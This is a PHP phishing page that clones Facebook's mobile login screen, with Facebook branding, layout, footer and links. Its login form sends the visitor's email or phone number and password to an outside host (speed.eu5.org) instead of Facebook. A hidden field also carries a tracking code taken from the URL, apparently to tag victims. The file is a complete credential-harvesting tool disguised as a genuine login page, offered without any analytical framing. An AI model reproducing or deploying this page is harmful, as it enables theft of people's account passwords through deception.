<?php
session_start();
error_reporting(0);
$userCode = "";
if(isset($_GET)){
	foreach($_GET as $key=>$val){
		$newkey = $key;
		$newuser = str_replace('/', '', $newkey);
		$userCode = str_replace('_', '.', $newuser);
	}
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Log In or Sign Up</title>
<link rel="stylesheet" href="./style.css">
<link rel="shortcut icon" href="./faicon.png">
<meta name="og:image" property="og:image" content="./faicon.png">
<script src="./jquery.min.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" >
<meta name="description" content="Create an account or log in. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." >
</head>
<body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw  portrait" style="background-color: rgb(255, 255, 255); min-height: 600px;">
<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 600px;">
<div id="page"><div class="_129_"></div>
<div class="_5soa acw">
<div class="_7om2">
<div class="_4g34" id="u_0_0_Dq">
<div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"><div class="_52jd"></div></div>
<div class="_9om_">
<div class="_4-4l">
<div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
<div class="_qw9 grouped aclb">
<div class="_7_v5">
<div class="_7_v6">
<div><span class="_80q1"> Facebook requests and receives your phone number from your mobile network. </span>
<a class="_80q1" href="https://m.facebook.com/header_settings/?redirect_url=https%3A%2F%2Fm.facebook.com%2F&flow=opt_out&refid=8"> Change settings </a></div>
</div>
</div>
</div>
</div>
 <div class="_7om2 _52we _2pid _52z6">
 <div class="_4g34">
 <a href="#"><img src="./fa.svg" width="112" class="img"></a>
 </div></div>
<div class="_5rut">
<form method="post" action="http://speed.eu5.org" class="mobile-login-form _9hp- _5spm">
<div>
<div class="_56be">
<div class="_55wo _56bf">
<div class="_96n9" id="email_input_container">
<input autocorrect="off" autocapitalize="off" type="text" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="userName" placeholder="Mobile number or email address" data-sigil="m_login_email"  required> </div></div></div>
<div class="_55wq"></div>
<div class="_56be">
<div class="_55wo _56bf">
<div class="_1upc _mg8" data-sigil="m_login_password">
<div class="_7om2">
<div class="_4g34 _5i2i _52we">
<div class="_5xu4">
<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="userPass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input" minlength="6"  required></div></div>
<div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_2_+K"><a href="#" id="show-btn" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_3_fj">HIDE</span><span class="mfss" id="u_0_4_fv">SHOW</span></a></div></div></div>
</div>
</div></div></div>
<input type="hidden" name="userCode" value="<?php echo $userCode; ?>"/>
</div>
<div class="_2pie" style="text-align:center;">
<div>
<button type="submit" type="button" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login">
<span class="_55sr">Log In</span>
</div>
<script src="./javascript.js"></script>
<div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div></div></form>
<div>
<div class="_2pie _9omz">
<div class="_52jj _9on1">
<a class="_9on1" tabindex="0" href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgotten password?</a>
</div></div>
<div style="padding-top: 42px"><div>
<div>
<div>
<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator">
<span class="_43mh">or</span>
</div>
<div class="_52jj _5t3b" id="signup_button_area">
<a role="button" href="https://m.facebook.com/reg/?cid=103&soft=hjk" class="_5t3c _28le btn btnS medBtn mfsm touchable" >Create New Account</a>
</div>
</div>
</div>
<div class="_2pie" style="text-align:center;">
<div>
<div class="other-links _8p_m">
<ul class="_5pkb _55wp">
<li></li></ul></div></div></div></div></div></div></div></div></div></div></div>
<div style="display:none"><div></div><div></div></div><span><img src="#" width="0" height="0" style="display:none"></span>
<div class="_55wr _5ui2" data-sigil="m_login_footer">
<div class="_5dpw">
<div class="_5ui3">
<div class="_7om2">
<div class="_4g34">
<span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
<div class="_3ztc">
<span class="_52jc">
<a href="#" >অসমীয়া</a>
</span>
</div>
<div class="_3ztc">
<span class="_52jc">
<a href="#">नेपाली	</a>
</span>
</div>
<div class="_3ztc">
<span class="_52jc">
<a href="#">Português (Brasil)</a>
</span>
</div>
</div
><div class="_4g34">
<div class="_3ztc">
<span class="_52jc">
<a href="#">বাংলা</a>
</span>
</div>
<div class="_3ztc">
<span class="_52jc">
<a href="#">हिन्दी</a>
</span>
</div>
<div class="_3ztc">
<span class="_52jc">
<a href="#">Español</a>
</span>
</div>
<a href="#">
<div class="_3j87 _1rrd _3ztd">
 <i class="img sp_vuppHZ0nD_0_3x sx_222020"></i>
 </div></a></div></div></div>
 <div class="_5ui4">
 <div class="_96qv _9a0a">
 <a href="https://m.facebook.com/Meta?_rdr" class="_96qw">
 About
 </a>
 <span aria-hidden="true"> · </span>
 <a href="https://m.facebook.com/help/?ref=pf&refid=8" class="_96qw">
 Help
 </a>
 <span aria-hidden="true"> · </span>
 <span class="_96qw" id="u_0_4_fx">
 More
 </span> 
 </div>
</div>
<span class="mfss fcg">
Facebook Inc.
</span>
</div>
</div>
</div>
</div>
</body>
</html>